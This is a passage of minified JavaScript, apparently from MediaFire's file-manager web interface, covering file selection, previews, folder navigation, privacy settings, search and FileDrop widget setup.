d=0;d<eB&&d<=eA&&d<=eA-eE[er]*eB&&aCurrentOrder[d][0];)e=document.getElementById("filecheck"+(d+1)),t=es[aCurrentOrder[d][0][1]],e&&1==e.checked&&t&&(1==t[1]&&1!=t[11]&&(n>0&&(a+=";;",o+=";;"),a+=t[3],o+=t[5],n++),2==t[1]&&1!=t[11]&&(n>0&&(a+=";;",o+=";;"),a+=t[15],o+=t[5],n++)),d++;if(n<=0)return aH(0,"No public files or folders are currently selected","please select one or more non-private items before attempting to send them via email."),!1;r.value=a,i.value=o,aH(2,"Sending "+n+" item(s) via email.."),s?s.submit():aH(0,"HTML components missing","Unable to perform the operation. Please contact support.")}else aH(0,"Select at least one public file or folder to email..")}function bbX(e,t,a){var o=document.getElementById("thumbpop"+t);if(es[a]&&1==es[a][2]&&o)switch(e){case 1:cE(document.getElementById("previmg"+t),es[a][15]),o.className="thumbpop"+t;break;case 2:default:o.className="hide"}}function MyFilesSwapOptions(){for(var e=0;eS[e]||fN[e];e++)document.getElementById(eS[e])&&(document.getElementById(eS[e]).className="hide"),document.getElementById(fN[e])&&(document.getElementById(fN[e]).className="show");try{if(1==Number(qm))for(e=0;qj[e]||qi[e];e++)document.getElementById(qj[e])&&(document.getElementById(qj[e]).className="hide"),document.getElementById(qi[e])&&(document.getElementById(qi[e]).className="show")}catch(e){}}function dV(e){var t=document.getElementById("curr_previmage_name"),a=document.getElementById("curr_previmage_id");if(!t||!a)return aH(0,"Missing site components."),!1;var o="/imageview.php?quickkey="+es[a.value][3]+"&thumb="+e;window.open(o)}function cP(){var e=aL("thumbsize");0!=parseInt(e)&&1!=parseInt(e)||(eV=parseInt(e));var t=aL("mflt");if(parseInt(t)>0&&(mu=parseInt(t)),!document.getElementById("is_shared")||1!=document.getElementById("is_shared").value){var a=aL("mflf");if(a){var o=!1;if(void 0!==a){for(var n=0;n<es.length;n++)try{if(a==es[n][3]){o=!0;break}}catch(e){}o&&(jE=a)}}var r=aL("mfpf");r&&(jS=r)}var i=aL("mfipp");if(i&&(bbD=i/1),!document.getElementById("is_shared")||1!=document.getElementById("is_shared").value){var s=aL("mfsf");s&&(kc=s/1);var l=aL("mfsd");l&&(gD=l/1)}}function dX(){var e=document.getElementById("form_todolist1"),t=document.getElementById("form_todolist2"),a=document.getElementById("form_todotype"),o=document.getElementById("form_todoform"),n=document.getElementById("curr_previmage_name"),r=document.getElementById("curr_previmage_id");if(o&&a&&t&&e&&n&&r){if(confirm("Are you sure you want to delete the image named '"+n.value+"'?")){a.value=1,e.value="",t.value="";var i;return(i=es[r.value])&&(e.value+=i[1]+":"+i[3]+";",baY(r.value)),e.value&&(aH(2,"Deleting 1 Image.."),o.submit(),fg=-1,aG(-1),bdm()),!1}return!1}aH(0,"Missing site components.")}function CyclePreview(e){if(aCurrentOrder[e+(fg-1)]&&1==aCurrentOrder[e+(fg-1)][1]&&document.getElementById("imagethumb"+(e+fg)))fg=e+fg;else if(e<0){for(var t=eB;t>=1;t--)if(aCurrentOrder[t-1]&&1==aCurrentOrder[t-1][1]){fg=t;break}}else for(t=1;t<=eB&&t<=eA&&t<=eA-eE[er]*eB;t++)if(1==aCurrentOrder[t-1][1]){fg=t;break}aG(fg)}function bdm(){gG=document.getElementById("preview_box"),Qh=document.getElementById("myimages"),hy=document.getElementById("preview_window_show"),hz=document.getElementById("preview_window_hide"),gG&&(gG.innerHTML=""),hy&&(hy.className="preview_image"),hz&&(hz.className="hide"),Qh&&(Qh.style.minHeight=""),"function"==typeof window.onscroll&&window.onscroll(),bbC()}function bbC(){for(var e=1;e<=eB&&e<=eA&&e<=eA-eE[er]*eB;e++)qC=document.getElementById("imagethumb"+e),qC&&1==aCurrentOrder[e-1][1]&&("small_private"==qC.className||"medium_private"==qC.className?qC.className=eV?"small_private":"medium_private":"small_password"==qC.className||"medium_password"==qC.className?qC.className=eV?"small_password":"medium_password":"small_private_selected"==qC.className||"medium_private_selected"==qC.className?qC.className=eV?"small_private":"medium_private":"small_password_selected"==qC.className||"medium_password_selected"==qC.className?qC.className=eV?"small_password":"medium_password":qC.className=eV?"small_thumbnail":"medium_thumbnail")}function aG(e){if(-1!=fg||-1!=e||gX>0){if(fg=-1,e>=0)fg=e;else for(var t=1;t<=eB&&t<=eA&&t<=eA-eE[er]*eB;t++)if(1==aCurrentOrder[t-1][1]){fg=t;break}if(bbC(),document.getElementById("imagethumb"+fg)){var a=document.getElementById("imagethumb"+fg),o="";"small_private"==a.className||"medium_private"==a.className?(a.className=eV?"small_private_selected":"medium_private_selected",o=" image_private"):"small_password"==a.className||"medium_password"==a.className?a.className=eV?"small_password_selected":"medium_password_selected":a.className=eV?"small_select":"medium_select",Qh=document.getElementById("myimages"),hy=document.getElementById("preview_window_show"),hz=document.getElementById("preview_window_hide"),gG=document.getElementById("preview_box"),gG.innerHTML="",gG&&(gG.className="preview_image"+o,mV=Bf(eH[7].replace(/#FILENUM#/g,"PREVIEW"),aCurrentOrder[fg-1][0][1],0,0),gG.innerHTML=mV),Qh&&(Qh.style.minHeight="1025px"),hz&&(hz.className="preview_image"),hy&&(hy.className="hide")}else aH(0,"NOTICE: No image available to preview.");ae("sharetabsfilePREVIEW-",1),"function"==typeof window.onscroll&&window.onscroll(),Xc(0,document.getElementById("sharetemplatefilePREVIEW"),"PREVIEW","sharedtabsfileinfoPREVIEW-")}else bdm()}function uH(e,t,a){for(var o in aCurrentOrder)if(aCurrentOrder[o][5]==e){aCurrentOrder[o][4]=t;break}if(a=a||!1)for(var n in es)if(es[n][3]==e){es[n][16]=t;break}}function Qw(e){Qg("Password protect this file",[["password","Password: (Enter a password to protect this file)","password",document.getElementById("password_list"+e).value]],(function(t){Zi(3,"Updating password for '"+document.getElementById("textfilename"+e).value+"'..please wait.."),aqr(1,"add_password"+e,"add_password"+e,"hide","div"),document.getElementById("password_list"+e).value=t.password,document.getElementById("form_todoform"+e).submit()}),null,"Save")}function PQ(e,t){eL!=eU&&1!=jQuery("#is_shared").val()&&(MP||baI(null,eL,e,t)&&($infobox=jQuery("#folder_infobox"),$infobox.toggleClass("thisfolder_private")))}function baI(e,t,a,o){var n,r=document.getElementById("myfileswork");if(r){for(var i,s=0;i=es[s];s++)if(i[3]==t){var l;if("2"==i[1])for(var d=0;l=es[d];d++)if("2"==l[1]&&l[4]==t){if(void 0===o)return QS("Change privacy settings to "+(1==a?"private":"public"),"Would you like to apply the privacy change to the sub-folders of <b>"+i[5]+"</b> ?",[["all","All Subfolders"],["this","This Folder"],["cancel","Cancel","grey"]],(function(o){"all"==o?baI(e,t,a,!0):"this"==o&&baI(e,t,a,!1)})),!1;o&&DoRecursiveFolderAclChange(t,a);break}i[11]=a,es[s]=i,n=o?"/dynamic/doaclchange.php?quickkey="+t+"&acl="+a+"&type="+i[1]+"&filenum="+e+"&recursive=1":"/dynamic/doaclchange.php?quickkey="+t+"&acl="+a+"&type="+i[1]+"&filenum="+e,r.location?r.location=n:r.src=n;break}for(var c in aCurrentOrder)if(aCurrentOrder[c][5]==t){aCurrentOrder[c][3]=a;break}return!0}}function DoRecursiveFolderAclChange(e,t){for(var a,o=0;a=es[o];o++)"2"==a[1]&&a[4]==e&&(a[11]=t,DoRecursiveFolderAclChange(a[3],t))}function dI(e,t){uH(t,0),document.getElementById("password_list"+e).value="";for(var a=0;es[a];a++)if(es[a][3]==t)return es[a][14]="",es[a][16]=0,document.getElementById("form_todoform"+e).submit(),!0;return!1}function dQ(e){return confirm("Do you want to remove the password for '"+e+"'?")}function Zz(){var e=document.getElementById("detailedviewA");e&&1==gf?e.innerHTML="Hide Extra Details":e&&0==gf&&(e.innerHTML="Show Extra Details")}function cZ(){1==gf?(aY("advancedview",0,90),gf=0):(aY("advancedview",1,90),gf=1),Zz(),jQuery("#file_details_toggle").toggleClass("details_hidden",!!gf),RenderMyFiles(er,eN)}function Ro(){MP=!1,jQuery("#folder_infobox").removeClass("searchmode"),jQuery("#main_files_container, #new_folder_trigger").removeClass("searchmode"),jQuery("#clear_search").hide()}function aN(){var e=document.getElementById("search_input"+er);e&&""!=e.value&&(e.value="");var t=document.getElementById("search_delete_button"+er);t&&(t.style.visibility="hidden"),fw="",Ro(),eA=-1,eE[er]=0,DoHide("search_processing_icon"+er),4==kc&&(kc=0,Um())}function bbA(e,t){var a=document.getElementById("search_delete_button"+t);a&&(a.style.visibility=e)}function bbP(e){jQuery("#clear_search").show();if(e==fw)return DoHide("search_processing_icon"+er),!1;var t=document.getElementById("search_input"+er);if(t&&e!=t.value&&"Viewing All"!=t.value)return DoHide("search_processing_icon"+er),!1;DoShow("search_processing_icon"+er),Sj=Sq(fw=e),!MP&&fw&&(kc=4,gD=0,Um()),MP=!!fw,eA=-1,eE[er]=0,RenderMyFiles(er,eN),0==fw.length&&(bbA("hidden",er),aN()),MP&&(bbA("visible",er),jQuery("#folder_infobox, #new_folder_trigger").addClass("searchmode"),jQuery("#main_files_container").addClass("searchmode")),DoHide("search_processing_icon"+er)}function Sq(e){for(So=new RegExp('^([^"]*)["]([^"]*)["](.*)$'),Si=Array(),Si.push(e),Sl=Array();Si.length;)if(Sk=Si.shift(),acF=So.exec(Sk))acF[1]&&Si.push(acF[1]),acF[2]&&Sl.push(acF[2]),acF[3]&&Si.push(acF[3]);else{Sk=Sk.replace('"',""),Sn=Sk.split(" ");for(var t=0;t<Sn.length;t++)Sm=Sn[t].trim(),Sm.length&&Sl.push(Sm)}return Sl.join("|")}function baY(e){var t=es[e];if(!t)return!1;t[0]=0}function cG(e,t,a){for(var o,n=!1,r="",i=!1,s=-1;o=es[++s];)1==o[0]&&o[4]==e&&(2==o[1]?(0!=(n=cG(o[3],t+1))?r+=o[1]+":"+o[3]+";"+n:r+=o[1]+":"+o[3]+";",a||baY(s),i=!0):(r+=o[1]+":"+o[3]+";",a||baY(s),i=!0));return!!i&&r}function Gm(e){return-1==e.lastIndexOf(".")?"":e.substr(e.lastIndexOf(".")+1).toLowerCase()}function Gp(){for(var e=Array(),t=0,a=1;a<=eB&&a<=eA&&a<=eA-eE[er]*eB;a++)eR=document.getElementById("filecheck"+a),Ub=es[aCurrentOrder[a-1][0][1]],eR&&1==eR.checked&&Ub&&(e[t++]=Array(aCurrentOrder[a-1][0][1],Ub));return e}function bqy(e){if(fu||hq){var t,a=[["2",e,0]];if(eL!=eU)for(var o=0;o<axL.length;o++)axL[o][1]==eL&&axL[o][0];(t=Dk(e,1))?(a=a.concat(t),Co(a,"")):aH(0,"Folder must contain at least one item to zip.")}else Ck()}function dU(e,t,a,o){if(!(o&&e&&t&&a))return!1;var n=t.value,r=t[t.selectedIndex].text.trim();if(HX>0)if(MP||eL!=n){o.value="";for(var i=!1,s=null,l=null,d=eU,c=eU,f=1;f<=aCurrentOrder.length;f++)if((s=document.getElementById("filecheck"+f))&&(l=es[aCurrentOrder[f-1][0][1]],c=n,s&&1==s.checked&&l)){if(l[4]==n){aH(0,"One of the source folders ("+l[5]+") is already in the destination folder, nothing will be moved. "),i=!0;break}if(2==l[1]){if(l[3]==n){aH(0,"One of the source folders ("+l[5]+") is the destination folder, nothing will be moved. "),i=!0;break}for(var u=0;(d=aE(c))!=eU&&u<1e3;){if(d==l[3]){i=!0,aH(0,"The source folder ("+l[5]+") is in the destination tree, you cannot move folders in this fashion.");break}c=d,u++}}i||(o.value+=l[1]+":"+l[3]+";")}if(i)return o.value="",!1;0!=HX&&(NV=1==HX?"":"s",aH(2,"Moving "+HX+" selected item"+NV+" to folder '"+r.trim()+"'..")),a.submit()}else aH(0,"The destination folder ('"+r+"') and the current folder selected are the same.");else aH(0,"You must select at least one item to move.")}function aE(e){for(var t=0;t<fz+1;t++)if(axL[t][1]==e)return axL[t][3];return 0}function OF(){var e=axL[GM]&&eL!=eU?axL[GM][0]:"My Files";"My Files"==e&&1==jQuery("#is_shared").val()&&(e="Shared Files"),jQuery(".location_title").text(e)}function ak(e,t){if(e=e||eU,null==axL)return setTimeout((function(){ak(e)}),1e3),!1;if(!MP&&e==eL)return!1;if(!e)return!1;t||aN(),eL=e,eA=-1,eE[er]=0;var a,o=document.getElementById("current_folder_name"+er),n=document.getElementById("parent_folder_names"+er);if(o&&n){var r=eU;n.innerHTML="",o.innerHTML="";for(var i=0;i<fz+1;i++)if(axL[i]&&axL[i][1]==eL){GM!=i&&(GM=i,Oq()),axL[i][1]!=eU&&(o.innerHTML="&nbsp;/&nbsp; <span>"+axL[i][0]+"</span>"),r=axL[i][3];break}for(var s=Array(),l=0;r!=eU;)for(i=0;i<fz+1;i++)if(axL[i][1]==r){s[l]='&nbsp;/&nbsp; <a href="#" class="breadcrumb" data-quickkey="'+axL[i][1]+'" OnClick=" ak(\''+axL[i][1]+"'); return false;\">"+axL[i][0]+"</a> ",r=axL[i][3],l++;break}for(;l>0;)n.innerHTML+=s[--l];document.getElementById("is_shared")&&1==document.getElementById("is_shared").value&&1!=Number(qm)||(aU("mflf",eL,100),aU("mfpf",r,100))}RenderMyFiles(er,eN),OF(),axL[GM]&&(a=kr(axL[GM][1])),jQuery("#folder_infobox").toggleClass("thisfolder_private",!a||1==a[11]),eL==eU?(jQuery("#folder_infobox, #main_files_container, #view_options").addClass("thisfolder_root"),jQuery("#infobox_lg").css("display","none"),jQuery(".flyout_pointer_left").css("display","none"),jQuery("#view_details").addClass("notset"),setTimeout((function(){jQuery("#folderinfo_details").slideUp(600)}),200),jQuery("#folder_share").toggleClass("control_disabled",!US()),NF()):(jQuery("#folder_infobox, #main_files_container, #view_options").removeClass("thisfolder_root"),OH(),jQuery("#infobox_lg").css("display",""),jQuery(".flyout_pointer_left").css("display",""),jQuery("#view_details").removeClass("notset"),jQuery("#folder_share").toggleClass("control_disabled",a&&1==a[11]),Pu(a&&a[13]))}var ajn=!1,NX=!1;function NF(){jQuery("#folder_infobox").removeClass("show_folderpreview")}function Pu(e){""!==e?NX||(!1!==ajn&&clearTimeout(ajn),jQuery("#infobox_desc_text").text(e),jQuery("#folder_infobox").addClass("show_folderpreview"),ajn=setTimeout((function(){NF()}),5e3)):NF()}function OH(){if((Wk=axL[GM])&&(kf=kr(Wk[1]))){jQuery("#infobox_name").text(kf[5]);var e=cF(eL);jQuery("#infobox_details").text("Created: "+kf[10]+", "+e[1]+" folders, "+e[0]+" files");for(var t="",a=kf[12].split(" "),o=0;(a[o]||a[o+1])&&o<30;o++)t+="<a href='#' OnClick='document.getElementById(\"search_input"+er+"\").value=this.innerHTML; bbP(this.innerHTML); return false;'>"+a[o]+"</a> ";var n=kf[13],r=!t&&!n;t||(t='<a href="#" class="edit_fileinfo_trigger">Add tags...</a>'),n||(n='<a href="#" class="edit_fileinfo_trigger">Add description...</a>'),jQuery("#infobox_tags").html(t),jQuery("#infobox_desc").html(n),jQuery("#folderinfo_filecount").html("Folders: "+e[1]+"<br>Files: "+e[0]),jQuery("#folderinfo_tags").html(t),jQuery("#folderinfo_desc").html(n),r&&jQuery("#folderinfo_details").slideUp(600)}}function cX(){aS(0,kK)}function cT(e,t){if(t=t||"move_dest_"+e,1==iR)var a='<select id="'+t+'" name="move_dest_'+e+'" style=" width: 120px;">';else a='<select id="'+t+'" name="move_dest_'+e+'" style=" width: 150px;">';for(var o=0,n=0;n<fz+1;n++)if(axL[n]){o="";for(var r=0;4*axL[n][2]>r;r++)o+="&nbsp;";a+='<option value="'+axL[n][1]+'">'+o+axL[n][0]+"</option>"}return a+="</select>"}function apN(e,t,a){if(!(fz>0))return axL=Array(),!1;if(a>=20)return aH(0,"Maximum Folder Depth Reached!"),!1;0==t&&(axL=Array(fz),axL[0]=Array("My Files",eU,0,eU),t++);for(var o="",n=0;n<fz&&fd[n];n++)(o=es[fd[n][1]])[4]==e&&1==o[0]&&2==o[1]&&"deleted"!==o[18]&&(axL[t]=Array(o[5],o[3],a,o[4]),t++,t=apN(o[3],t,a+1));return t}function aS(e,t){0==(t=null==t?"#FFFFFF":t)&&(t="");var a=document.getElementById("new_folder"),o=document.getElementById("tag_selected"),n=document.getElementById("move_selected"),r=document.getElementById("email_selected"),i=document.getElementById("viewaccount_selected"),s=document.getElementById("new_folderA"),l=document.getElementById("tag_selectedA"),d=document.getElementById("move_selectedA"),c=document.getElementById("email_selectedA"),f=document.getElementById("viewaccount_selectedA");if(o.className="hide",a.className="hide",n.className="hide",r.className="hide",i.className="hide",l.style.backgroundColor=t,s.style.backgroundColor=t,d.style.backgroundColor=t,c.style.backgroundColor=t,f.style.backgroundColor=t,e!=gn){switch(e){case 1:document.getElementById("new_folder_name").value="",a.className="show",s.style.backgroundColor="#E1EDFF",document.getElementById("new_folder_name").focus();break;case 2:document.getElementById("tag_desc_list").value="",o.className="show",l.style.backgroundColor="#E1EDFF",document.getElementById("tag_desc_list").focus();break;case 3:document.getElementById("move_dropdown").innerHTML=cT("navbar_filelist"),n.className="show",d.style.backgroundColor="#E1EDFF",document.getElementById("move_dest_navbar_filelist").focus();break;case 4:document.getElementById("email_files_to").value="",r.className="show",c.style.backgroundColor="#E1EDFF",document.getElementById("email_files_to").focus();break;case 5:i.className="show",f.style.backgroundColor="#E1EDFF",document.getElementById("stat_num_files").focus()}gn=e}else gn=0}function dE(e){e.value!=hC&&(e.disabled=!0,bbj(e.value),e.disabled=!1)}function bbj(e){hC=e,eA=-1,eE[er]=0,RenderMyFiles(er,eN)}function dN(e,t,a,o){switch(aH(2,"Creating Folder.."),bde(t.value)){case-3:aH(0,"The folder name you entered contains invalid characters."),e.disabled=!1;break;case-2:aH(0,"The folder name you entered is too long, please correct and try again."),e.disabled=!1;break;case-1:aH(0,"The folder name you entered is too short, please correct and try again."),e.disabled=!1;break;case 0:document.getElementById("new_folder_parent").value=eL,o.submit();break;default:aH(0,"The folder name you selected to create was invalid for an unknown reason, please check it and try again."),e.disabled=!1}}function eo(e){for(var t=e,a=0;a<t.length;a++){var o=t.charAt(a).charCodeAt(0);if(!(o>31&&o<59||o>57&&o<94||o>93&&o<123))return!1}return!1}function ep(e){for(var t=e,a=0;a<t.length;a++){var o=t.charAt(a).charCodeAt(0);if(!(o>47&&o<59||o>64&&o<90||o>96&&o<123))return!1}return!1}function bde(e){var t=0;return e.length<1&&(t=-1),e.length>40&&(t=-2),t}function xO(e){var t,a;switch(e){case 2:t="dropbox_color_options";break;case 3:t="dropbox_advanced_options";break;case 1:default:t="dropbox_basic_settings"}DoHide("dropbox_basic_settings"),DoHide("dropbox_color_options"),DoHide("dropbox_advanced_options"),DoShow(t);for(var o=1;o<=3;o++)(a=document.getElementById("dropbox_tab_"+o))&&a.className&&(a.className="");(a=document.getElementById("dropbox_tab_"+e))&&(a.className="current")}function na(e,t){var a;if(a=document.getElementById("hextext_"+e))return xI(e,!0,a,["#000000","#ffffff","#cccccc","#666666","#000000","#9900ff","#003399","#00ccff","#00ff99","#66ff00","#ffff00","#ff6600","#ff0000"][t])}function xI(e,t,a,o){var n;if(!a&&!(a=document.getElementById("hextext_"+e)))return!1;o&&(a.value=o);for(var r=a.value.replace(/[^0123456789ABCDEFabcdef]/g,"");r.length<6;)r+="0";return r="#"+r,(a.value.length>7||t)&&(r=r.substr(0,7),a.value=r.toLowerCase()),(n=document.getElementById("color_preview_"+e))&&(n.style.background=r),String(a.value).replace(/[^0123456789ABCDEFabcdef#]/g,"")!=a.value?(a.value=r,zy(e,r),!1):(zy(e,r),!0)}function Al(e){var t;(t=document.getElementById("dropbox_step1"))&&(t.style.background=e)}function Ak(e){var t;(t=document.getElementById("dropbox_header_div"))&&(t.style.background=e)}function Ah(e){var t;(t=document.getElementById("dropbox_header_div"))&&(t.style.color=e)}function Ad(e){var t;(t=document.getElementById("dropbox_message_div"))&&(t.style.color=e)}function Ae(e){var t;(t=document.getElementById("dropbox_link"))&&(t.style.color=e)}function zx(e){var t;(t=document.getElementById("dropbox_header_div"))&&($("span.fileDropPreviewCount").text(parseInt($("#dbx_input_header").attr("maxlength"),10)-$("#dbx_input_header").val().length),$(t).text(e))}function zs(e){var t;(t=document.getElementById("dropbox_greeting"))&&(t.innerHTML=e)}function zy(e,t){var a;(a=[null,Al,Ak,Ah,Ad,Ae][e])&&a(t)}var DropboxObj={yi:480,Fb:0};function Bu(){function e(e){var t;if(t=document.getElementById(e))return t.value;aH(0,"Missing site components. Unable to set FileDrop.")}function t(e){var t,a;if((t=document.getElementById(e))&&(a=t.options[t.selectedIndex]))return a.value;aH(0,"Missing site components. Unable to set FileDrop.")}DropboxObj.yj=e("dbx_input_header"),DropboxObj.yh=e("dbx_input_greeting"),DropboxObj.yn=e("dbx_input_completion"),DropboxObj.yi=t("dbx_input_width"),DropboxObj.AF=e("hextext_1"),DropboxObj.AH=e("hextext_2"),DropboxObj.AC=e("hextext_3"),DropboxObj.AA=e("hextext_4"),DropboxObj.AB=e("hextext_5"),DropboxObj.zO=t("dbx_input_allow_description"),DropboxObj.uL=t("dbx_input_notification_email"),DropboxObj.Bh=t("dbx_input_allow_multiple")}function Ab(){var e,t=document.getElementById("form_dbx");if(Bu(),t){for(var a=[DropboxObj.yj,DropboxObj.yh,DropboxObj.yn],o=0,n=a.length;o<n;o++)if(""===a[o])return xO(1),void aH(0,"Please fill in all text fields.");var r=["dbx_folder","dbx_text1","dbx_text2","dbx_text3","dbx_color1","dbx_color2","dbx_color3","dbx_color4","dbx_color5","dbx_sharing","dbx_descrip","dbx_multi","dbx_width","dbx_email"],i=[DropboxObj.currentFolder,DropboxObj.yj,DropboxObj.yh,DropboxObj.yn,DropboxObj.AF,DropboxObj.AH,DropboxObj.AC,DropboxObj.AA,DropboxObj.AB,DropboxObj.Bg,DropboxObj.zO,DropboxObj.Bh,DropboxObj.yi,DropboxObj.uL];for(o=0,n=r.length;o<n;o++){if(!(e=document.getElementById(r[o])))return void aH(0,"Missing site components. Unable to set FileDrop.");e.value=i[o]}aH(2,"Saving FileDrop settings.");var s=tH.folders.yx(DropboxObj.currentFolder);aHa&&s&&s.parent&&aHa.aIX(s.parent.folderkey),t.submit()}else aH(0,"Missing site components. Unable to set FileDrop.")}function zZ(e){aH(2,"Disabling FileDrop."),zp(!1,e)}function zp(e,t,a){var o=document.getElementById("form_dbx_status"),n=document.getElementById("dbx_status_enable"),r=document.getElementById("dbx_silent_return"),i=document.getElementById("dbx_status_id");if(o&&n&&i&&r){e?(n.value="1",zr()):(n.value="0",zq()),r.value=a?"1":"0",i.value=void 0!==t?t:DropboxObj.currentFolder;var s=tH.folders.yx(i.value);aHa&&s&&s.parent&&aHa.aIX(s.parent.folderkey),o.submit()}else aH(0,"Missing site components. Unable to set FileDrop.")}function zr(){var e=DropboxObj.currentFolder;$("#folder-"+e).addClass("dropbox"),window.tH.folders.memory[e].dropbox_enabled="yes"}function zq(){var e=DropboxObj.currentFolder;$("#folder-"+e).removeClass("dropbox"),window.tH.folders.memory[e].dropbox_enabled="no"}function zW(e,t){aH(0,"Loading folder FileDrop data.","");var a=document.getElementById("form_dbx_folder"),o=document.getElementById("dbx_text_embeded"),n=document.getElementById("dbx_folderid");DropboxObj.currentFolder=e,DropboxObj.currentMyFilesPosition=t,DropboxObj.zF="";var r=document.getElementById("dbx_input_header"),i=document.getElementById("dbx_input_greeting"),s=document.getElementById("dbx_input_completion"),l=document.getElementById("dbx_input_width");r&&i&&s&&l?(r.value&&r.value!=DropboxObj.yj&&(DropboxObj.yj=r.value),i.value&&i.value!=DropboxObj.yh&&(DropboxObj.yh=i.value),s.value&&s.value!=DropboxObj.yn&&(DropboxObj.yn=s.value),a&&o&&n?(o.innerHTML="Retrieving folder data...",n.value=e,a.submit()):aH(0,"Missing site components.")):aH(0,"Missing site components.")}function Bl(e){function t(e,t){var a,o,n;if(a=document.getElementById(e))if("select"==a.type)for(o=0,n=a.length;o<n;o++)(a[o].value=t)&&(a[o].selected=!0);else a.value=t}if(DropboxObj.currentFolder){if(av(),arguments.length<2||"1"!=arguments[1]){if(!fu)return void(window.PremiumUpsellLightbox&&window.PremiumUpsellLightbox.showUpsell("pro","filedrop"));var a=confirm("This folder is not enabled as a FileDrop. Would you like to enable the folder as a FileDrop? (This can be undone at any time.)");if(!a)return void zq();zp(!0,DropboxObj.currentFolder)}zr(),arguments.length>1&&(t("dbx_input_header",arguments[2]),t("dbx_input_greeting",arguments[3]),t("dbx_input_completion",arguments[4]),zx(arguments[2]),zs(arguments[3]),t("hextext_1",arguments[5]),t("hextext_2",arguments[6]),t("hextext_3",arguments[7]),t("hextext_4",arguments[8]),t("hextext_5",arguments[9]),na(1,arguments[5]),na(2,arguments[6]),na(3,arguments[7]),na(4,arguments[8]),na(5,arguments[9]),t("dbx_input_allow_description",arguments[10]),t("dbx_input_allow_multiple",arguments[12]),t("dbx_input_notification_email",arguments[13])),e&&(DropboxObj.zF=e),Fd(!0),zn(),xO(1),window.afU()}}function zM(e){var t;e&&(t=e.options[e.selectedIndex])&&(DropboxObj.yi=t.value),zn()}function zn(){var e=GetDefaultSubDomain();(elm=document.getElementById("dbx_text_embeded"))?(vU='<script type="text/javascript">',vU+="var mf_dropbox_width="+DropboxObj.yi+";",DropboxObj.Fb>0&&(vU+="var mf_dropbox_extralines="+DropboxObj.Fb+";"),vU+='var mf_dropbox_id="'+DropboxObj.zF+'";',vU+='<\/script><script type="text/javascript" src="//'+e+'.mediafire.com/dropbox/dropbox.js"><\/script>',elm.value=vU,document.getElementById("hostedfiledrop_text_share").value="http://"+e+".mediafire.com/filedrop/filedrop_hosted.php?drop="+DropboxObj.zF):aH(0,"Missing site components.");(elm=document.getElementById("dropbox_step1"))&&(-1==DropboxObj.yi?elm.style.width="100%":elm.style.width=DropboxObj.yi+"px")}function Ck(){LoadIframeLightbox("/templates/upgrade/bulkdownload.php",800,460)}var Xe,Zw={},aVt="",aME={};function Eh(e,t){av(),aVt=e,aME.use_own_bandwidth=!1,t?LoadIframeLightbox("/templates/confirm/approvebandwidthlimitedbulkdownload.html",530,327):LoadIframeLightbox("/templates/confirm/approvebulkdownload.html",530,337)}function DisplayZipInsufficientBandwidthApproval(){av(),LoadIframeLightbox("/templates/confirm/approve_bw_insufficient_bulk_download.html",530,272)}function aUG(e){av(),aVt=e,aME.allow_large_download=!1,LoadIframeLightbox("/dynamic/template_popup.php?page=approvelargedownload",530,267)}function bpS(){aME.allow_large_download=!0,LF.aUA(aVt,aME)}function aMD(){aME.use_own_bandwidth=!0,LF.aUA(aVt,aME)}function akg(e){var t="";return $.each(e.files,(function(e,a){t+="1:"+a.quickKey+";"})),$.each(e.folders,(function(e,a){t+="2:"+a.folderKey+";"})),t}function Hm(e){var t=document.getElementById("form_toolbardata"),a=document.getElementById("form_toolbarform");a&&t?(t.value=e,a.submit(),aH(0,"Sending files to toolbar.")):aH(0,"Missing site components.")}function Fe(e){var t=[];t[4]=[106],t[5]=[73,92,105,108,44,45,46,47,58,59,32],t[6]=[74,91,93,102,40,41],t[7]=[116],t[8]=[95,114,122,42],t[9]=[63,99,115,118,120,121],t[10]=[83,97,101,107,111,48,49,50,51,52,53,54,55,56,57,36],t[11]=[70,75,76,80,84,88,89,90,98,100,103,104,110,112,113,117],t[12]=[65,195,135,66,67,69,82,86],t[13]=[78,79,81,85,94,43,60,61,68,71,72],t[14]=[119],t[15]=[109],t[16]=[64,77,87];for(var a,o,n,r=1,i=e.length,s=0;s<i;s++){n=!1,o=e.charCodeAt(s);for(var l=4;!n&&l<=16;l++)for(var d=0;!n&&d<t[l].length;d++)t[l][d]==o&&(a=l,n=!0);n||(a=10.5),r+=a}return r}function Fd(e){if(DropboxObj.yi>0){var t=document.getElementById("dbx_input_header"),a=document.getElementById("dbx_input_greeting"),o=document.getElementById("dbx_input_completion"),n=document.getElementById("dbx_input_width");if(t&&a&&o&&n){var r,i=0,s=0,l=DropboxObj.yi-20;r=Fe(t.value),r*=1.04,i+=Math.floor(r/l),r=Fe(a.value),r*=.7,i+=Math.floor(r/l),r=Fe(o.value),r*=.7,(s+=Math.floor(r/l))>i&&(i=s),DropboxObj.Fb!=i&&(DropboxObj.Fb=i,e||zn())}else aH(0,"Missing site components.")}else 0!=DropboxObj.Fb&&(DropboxObj.Fb=0,e||zn())}function aXg(e){var t=["webkit","moz","ms","o"],a="hidden"in document?"hidden":null;if(!a)for(var o=0;o<t.length;o++){var n=t[o]+"Hidden";if(n in document){a=e?t[o]:n;break}}return a}function aXX(){var e=aXg(),t=document[e];return"string"==typeof t&&(t="hidden"==t),!!e&&t}function aod(){var e=aXg(!0);if(e&&window.addEventListener){var t=("hidden"!=e?e:"")+"visibilitychange";document.addEventListener(t,(function(){aXX()||aek||!aZe||FI()}))}}function bhv(e){for(var t=new Array,a=0,o=tH.aca.length;a<o;a++)"folders"==e&&tH.aca[a].folderkey&&t.push(tH.aca[a]),"files"==e&&tH.aca[a].quickkey&&t.push(tH.aca[a]);return t}function bfV(e){if(e.quickkey){var t=new tH.Cp(e,tH.currentFolder),a=bhv("files");a.push(t),a.sort(YT.file[sortBy]),sortAscending&&a.reverse(),a[0].quickkey!=t.quickkey&&(tH.files.Yx(t.quickkey,t),aoQ(t))}else if(e.folderkey){var o=new tH.yJ(e,tH.currentFolder),n=bhv("folders");n.push(o),n.sort(YT.folder["created"==sortBy?"created":"name"]),sortAscending&&n.reverse(),n[0].folderkey!=o.folderkey&&(tH.folders.Yx(o.folderkey,o),aoQ(o))}}function bgk(e){for(var t=!1,a=0,o=tH.aca.length;a<o;a++){var n=tH.aca[a];e&&n&&e.quickkey&&n.quickkey&&e.quickkey==n.quickkey&&(t=!0),e&&n&&e.folderkey&&n.folderkey&&e.folderkey==n.folderkey&&(t=!0)}return t}var bhF={};function bhD(e,t,a,o,n){if(n(FF()||window.tH.sh)){var 